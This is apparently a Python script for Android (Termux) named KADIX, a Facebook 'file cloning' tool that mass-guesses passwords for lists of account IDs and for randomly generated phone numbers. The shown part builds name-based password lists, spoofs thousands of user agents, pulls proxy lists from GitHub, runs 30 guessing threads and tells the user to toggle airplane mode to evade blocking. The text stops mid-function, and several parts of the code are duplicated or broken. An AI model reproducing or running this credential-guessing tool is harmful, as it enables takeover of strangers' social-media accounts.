bks=('https://t.me/kadikx8','https://t.me/kadikx8.lite','https://t.me/kadikx8','https://t.me/kadikx8')

try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4
    #import dz
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
    print('\n Installing missing modules ...')
    os.system('pip install requests bs4 futures==2 > /dev/null')
    os.system('python KADIX.py')
try:
    os.mkdir('/sdcard/KADIX')
except:pass
import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess 
from concurrent.futures import ThreadPoolExecutor
import requests,bs4,uuid,json,os,sys,random,datetime,time,re,subprocess
try:
    import rich
except ImportError:
    os.system('pip install rich')
    os.system('pip install http')
    os.system('pip install httpx')
    time.sleep(1)
os.system('xdg-open https://https://t.me/kadikx8/copnrt.03')



android_models=[]
try:
    xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass

usr=[]
try:
    xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass

gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550    5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]

#_________[ PROXY SERVER ]______>>
os.system('rm -rf .prox.txt')  
try:
    prox= requests.get('https://raw.githubusercontent.com/mafiat2/M01/main/.prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550    5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12','13'])
    c=f' en-us; {str(gt)}'
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for agent in range(10000):
    aa='Mozilla/5.0 (Linux; Android 6.0.1;'
    b=random.choice(['6','7','8','9','10','11','12','13'])
    c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/533.1'
    fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(fullagnt)
rug=[]
for nt in range(10000):
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C153 [FBAN/FBIOS;FBAV/139.0.0.46.90;FBBV/70207865;FBDV/iPhone6,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2.1;FBSS/2;FBCR/MEO;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/71160268]"
    rug.append(xx)
ruz=[]
for mtc in range(10000):
    rr=random.randint
    xd=f"Mozilla/5.0 (Linux; Android 7.0; Colors P45 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36]"
    ruz.append(xd)
    
#new ua
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#_______COLOUR______#
BLACK = '\x1b[1;90m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'

logo=(f"""
   \033[1;34m
dP     dP  .d888888  888888ba  dP dP    dP    
88   .d8' d8'    88  88    `8b 88 Y8.  .8P    
88aaa8P'  88aaaaa88a 88     88 88  Y8aa8P     
88   `8b. 88     88  88     88 88 d8'  `8b    
88     88 88     88  88    .8P 88 88    88    
dP     dP 88     88  8888888P  dP dP    dP    
                                              
                                                                                 
\033[97;1m══════════════════════════════════════════════
\033[1;32m[\033[1;31m•\033[1;32m] \033[1;32m𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : \033[1;37mKADIX
\033[1;32m[\033[1;31m•\033[1;32m] \033[1;32m𝐆𝐈𝐓𝐇𝗨𝐁    : \033[1;37mKADIX
\033[1;32m[\033[1;31m•\033[1;32m] \033[1;32m𝐒𝐓𝐀𝐓𝗨𝐒    : \033[1;37mFREE
\033[1;32m[\033[1;31m•\033[1;32m] \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   : \033[1;37m1.0
\033[1;32m[\033[1;31m•\033[1;32m] \033[1;32m𝐓𝐎𝐎𝐋      : \033[1;94mFILE CLONE
\033[97;1m═══════════════════════════════════════════""")
def linex():
    print('\033[97;1m═══════════════════════════════════════════')
os.system('xdg-open https://www.facebook.com/copnrt.03')
def loading():
    animation = [
        '[\x1b[1;91m■\x1b[0m□□□□□□□□□]',
        '[\x1b[1;92m■■\x1b[0m□□□□□□□□]',
        '[\x1b[1;93m■■■\x1b[0m□□□□□□□]',
        '[\x1b[1;94m■■■■\x1b[0m□□□□□□]',
        '[\x1b[1;95m■■■■■\x1b[0m□□□□□]',
        '[\x1b[1;96m■■■■■■\x1b[0m□□□□]',
        '[\x1b[1;97m■■■■■■■\x1b[0m□□□]',
        '[\x1b[1;98m■■■■■■■■\x1b[0m□□]',
        '[\x1b[1;99m■■■■■■■■■\x1b[0m□]',
        '[\x1b[1;91m■■■■■■■■■■\x1b[0m]']
    for i in range(50):
        time.sleep(0.14)
        sys.stdout.write(f'''\r {N}[{H}+{N}] {H}Loading...{N} ''' + animation[i % len(animation)] + '\x1b[0m ')
        sys.stdout.flush()
def clear():
        os.system('clear')
        print(logo)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s [%s•%s] %sActive Apks & Web Not Found %s        '%(N,H,N,H,N))
    else:
        print(f'\r{A} [•]%s Active Apks & Web 👇 '%(H))
        for i in range(len(game)):
            print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s [%s•%s] %sExpired Apks & Web Not Found %s        '%(N,M,N,M,N))
    else:
        print(f'\r{A} [•]%s Expired Apks & Web 👇 '%(M))
        for i in range(len(game)):
            print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]

def menu():
            clear()
        #    linex()
            
            print('\033[1;32m[\033[1;37m1\033[1;32m] \033[1;37mFile Cloning ')
            print('\033[1;32m[\033[1;37m2\033[1;32m] \033[1;37mContact With KADIX-HODA ')
            print('\033[1;32m[\033[1;37m3\033[1;32m] \033[1;37mContact With KADIX')
            print('\033[1;32m[\033[1;37m4\033[1;32m] \033[1;37mOur KADIX ')
          
            print('\033[1;32m[\033[1;37m5\033[1;32m] \033[1;37mLINK https://t.me/kadikx8')
   
            print('\033[1;32m[\033[1;37m0\033[1;32m] \033[1;37mEXIT ')
            linex()
            xd=input('\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mChose : ')
            if xd in ['1','01']:
                clear()
                #loading() 
                clear() 
                print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mPut file example:  /sdcard/File.txt  etc..')
                linex()
                file = input(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mPut file path\033[1;37m: ')
                try:
                    fo = open(file,'r').read().splitlines()
                except FileNotFoundError:
                    print(' File location not found ')
                    time.sleep(1)
                    menu()
                clear()
                #loading() 
                clear() 
                
                linex()
                print(' \033[1;32m[\033[1;37m1\033[1;32m] \033[1;37mMETHOD [NEW] \n \033[1;32m[\033[1;37m2\033[1;32m] \033[1;37mMETHOD [OLD] \n \033[1;32m[\033[1;37m3\033[1;32m] \033[1;37mMETHOD [NEW/OLD] \n \033[1;32m[\033[1;37m4\033[1;32m] \033[1;37mMETHOD [NEW/OLD]      ')
                linex()
                mthd=input(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mChoose: ')
                linex()
                clear() 
                #loading() 
                clear() 
                plist = []
                print(f'                  PASSWORD SYSTEM');linex();print(f'\033[1;32m[\033[1;37m1\033[1;32m] \033[1;37mAUTO PASSWORD CLONE\n\033[1;32m[\033[1;37m2\033[1;32m] \033[1;37mCHOICE PASSWORD CLONE');linex()
                ppp=input(f'\033[1;32m[\033[1;37m?\033[1;32m] \033[1;37mCHOICE : ')
                if ppp in ['1','01']:
                        plist.append('first last')               
                        plist.append('first12345')
                        plist.append('first first')
                        plist.append('last last') 
                        plist.append('last first') 
                        plist.append('firstfirst') 
                        plist.append('firstlast') 
                        plist.append('lastlast') 
                        plist.append('lastfirst') 
                        plist.append('firstfirst123')
                        plist.append('firstlast123') 
                        plist.append('lastlast123') 
                        plist.append('first123') 
                        plist.append('last123') 
                        plist.append('first1234') 
                        plist.append('first12345') 
                        plist.append('firstlast12345') 
                        plist.append('first123456') 
                        plist.append('first123456789')                      
                else:
                         try:
                                 clear()
                                 ps_limit = int(input(f'\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mPASSWORD LIMIT : '))
                         except:
                                 ps_limit =1
                         clear()
                         print(f'\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mEXAMPLE : firstlast/first@@/first123 ')
                         linex()
                         for i in range(ps_limit):
                                 plist.append(input(f'\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mPASSWORD NO {i+1} :{A} '))
                clear()
                #loading() 
                clear() 
                print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mDO YOU WANT ADD CP ID? TYPE y/n [YES/NO]: ')
                linex()
                cx=input(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mChoose: ')
                if cx in ['y','Y','yes','Yes','1']:
                    pcp.append('y')
                else:
                    pcp.append('n')
                with tred(max_workers=30) as crack_submit:
                    clear()
                    #loading() 
                    clear() 
                    total_ids = str(len(fo))
                    print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mTotal File id : \033[1;32m'+total_ids+f' ')
                    print(" \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mYour Crack  Start Please wait \n \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37m[\033[1;92mON\033[1;97m/\033[1;91mOFF\033[1;97m] Airplane mode after 5 minutes ")
                    linex()
                    for user in fo:
                        ids,names = user.split('|')
                        passlist = plist
                        if mthd in ['1','01']:
                            crack_submit.submit(api1,ids,names,passlist)
                        elif mthd in ['2','02']:
                            crack_submit.submit(api2,ids,names,passlist)
                        elif mthd in ['3','03']:
                            crack_submit.submit(api3,ids,names,passlist)
                        elif mthd in ['4','04']:
                            crack_submit.submit(api4,ids,names,passlist)
                        elif mthd in ['5','05']:
                            crack_submit.submit(api5,ids,names,passlist)
                        elif mthd in ['6','06']:
                            crack_submit.submit(api6,ids,names,passlist)
                        elif mthd in ['7','07']:
                            crack_submit.submit(api7,ids,names,passlist)
                        elif mthd in ['8','08']:
                            crack_submit.submit(api8,ids,names,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                menu() 
  
            elif xd in ['4','04']:
                 os.system('xdg-open https://t.me/KADIXokpy');menu()               
                     
            elif xd in ['3','03']:
                mm()
                create()
                dz._login()
                exit()
            elif xd in ['3','03']:
                 os.system('xdg-open https://t.me/vo03p');menu()
            elif xd in ['2','02']:
                 os.system('xdg-open https://t.me/KADIXokpy');menu() 
            elif xd in ['0','00']:
                exit(' Thanks for use the tool ')
            else:
                exit(' Option not found in menu...')
        
def pak():
                user=[]
                clear()
                print('\033[1;37m Example : 0306,0315,0335,0345');linex()
                code = input('\033[1;37m Put Code : ');linex()
                try:
                        limit = int(input('\033[1;37m Example : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as SHADOW:     
                        clear()
                        
                        tl = str(len(user))
                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mTotal id : \033[1;97m'+tl)
                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mSelect code :\033[1;97m '+code)
                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mKADIX Crack Has Been Running \n \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mUse Airplane after 5 minutes')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','malik123','kingkhan','baloch123','pak123','khan123']
                                SHADOW.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python SHADOW.py')
def bd():
                user=[]
                clear()
                print('\033[1;37m Example : 017,016,018')
                code = input('\033[1;37m PUT CODE: ')
                try:
                        limit = int(input('\033[1;37m Example : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as SHADOW:     
                        clear()
                        
                        tl = str(len(user))
                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mTotal id : \033[1;97m'+tl)
                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mSelect code :\033[1;97m '+code)
                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mⓋⒺⓃⓄⓂ Crack Has Been Running \n \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mUse Airplane after 2 minutes')
                        linex()
                        for psx in user:
                                ids = code+psx
